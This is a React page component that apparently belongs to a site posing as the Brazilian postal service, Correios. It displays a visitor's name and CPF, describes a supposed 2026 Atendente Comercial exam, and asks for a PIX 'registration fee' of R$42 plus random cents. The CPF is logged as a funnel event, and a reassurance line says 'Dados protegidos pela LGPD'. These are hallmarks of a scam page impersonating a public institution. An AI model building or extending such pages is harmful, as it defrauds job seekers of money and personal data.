import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const DetalhesInscricao = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const cepData = location.state?.cepData;
  const [centavos] = useState(() => Math.floor(Math.random() * 99) + 1);
  const valorInscricao = 42 + centavos / 100;

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: "/detalhes-inscricao", cepData });
    trackFunnelEvent("detalhes-inscricao", { cpf: cpfData.cpf });
    window.scrollTo(0, 0);
  }, [cpfData, navigate]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm("/pagamento"), {
      state: { cpfData, cepData, valorBeneficio: valorInscricao, protocolo: `COR-${Date.now()}` },
    });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Atendente Comercial > Inscrição > Detalhes" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">DETALHES DA INSCRIÇÃO — CONCURSO CORREIOS 2026</h1>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Nome</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Sobre o concurso */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Informações do Concurso</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Cargo</td><td>Atendente Comercial — Nível Médio</td></tr>
              <tr><td className="font-semibold">Remuneração</td><td>R$ 5.700 a R$ 9.000*</td></tr>
              <tr><td className="font-semibold">Vagas</td><td>15.153 em todo o Brasil</td></tr>
              <tr><td className="font-semibold">Banca</td><td>IBFC — Instituto Brasileiro de Formação e Capacitação</td></tr>
            </tbody>
          </table>

          {/* O que estudar */}
          <table className="tabela-zebra">
            <thead><tr><th>O que priorizar nos estudos</th></tr></thead>
            <tbody>
              <tr><td>Português e Matemática — Disciplinas básicas obrigatórias</td></tr>
              <tr><td>Provas anteriores dos Correios — Entenda o estilo do IBFC</td></tr>
              <tr><td>Raciocínio Lógico, Atendimento ao Cliente e Legislação Postal</td></tr>
              <tr><td>Simulados regulares — Afira seu desempenho</td></tr>
            </tbody>
          </table>

          {/* Taxa */}
          <div className="rounded border-2 border-accent bg-accent/10 p-4 text-center space-y-1">
            <p className="text-sm font-semibold text-foreground">Taxa de Inscrição</p>
            <p className="text-3xl font-black text-primary">
              R$ {valorInscricao.toFixed(2).replace(".", ",")}
            </p>
            <p className="text-xs text-muted-foreground">Pagamento via PIX — confirmação imediata</p>
          </div>

          <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
            PAGAR TAXA DE INSCRIÇÃO
          </Button>

          <p className="text-[10px] text-center text-muted-foreground">
            Pagamento seguro — Dados protegidos pela LGPD
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default DetalhesInscricao;
